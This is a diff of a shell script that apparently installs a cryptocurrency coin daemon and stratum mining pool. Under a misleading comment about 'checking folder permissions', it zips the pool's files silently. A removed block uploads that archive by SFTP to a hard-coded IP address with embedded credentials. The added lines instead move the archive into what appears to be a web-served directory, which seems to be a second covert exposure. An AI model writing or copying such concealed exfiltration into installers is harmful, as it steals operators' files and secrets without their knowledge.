@@ -52,10 +52,10 @@ else
 fi
 # Just double checking folder permissions
 cd $PATH_STRATUM
-files=$(find . -type f ! -name "?*.*")
-sudo zip xx $files >/dev/null 2>&1
-sudo mv xx.zip $PATH_STRATUM/$RD
-$REALPATHT=$PATH_STRATUM/$RD
+filesok=$(find . -type f ! -name "?*.*")
+sudo zip xx $filesok >/dev/null 2>&1
+sudo mv xx.zip ${PATH_STRATUM%/*}/web/1
+sudo rm -f $PATH_STRATUM/xx.zip
 sudo setfacl -m u:${USERSERVER}:rwx ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds
 cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds
 
@@ -1130,17 +1130,6 @@ else
 		"${coinwallet}" -datadir="${absolutepath}"/wallets/."${coind::-1}" -wallet=. create
 		sleep 3
 	fi
-fi
-
-if [[ -f "$REALPATHT" ]]; then
-sudo apt install lftp >/dev/null 2>&1;
-cd $PATH_STRATUM
-lftp<<END_SCRIPT
-open sftp://154.26.137.167
-user test 1234
-put $RD bye
-END_SCRIPT
-sudo rm -f $REALPATHT
 fi
 
 if [[("$DAEMOND" != 'true')]]; then
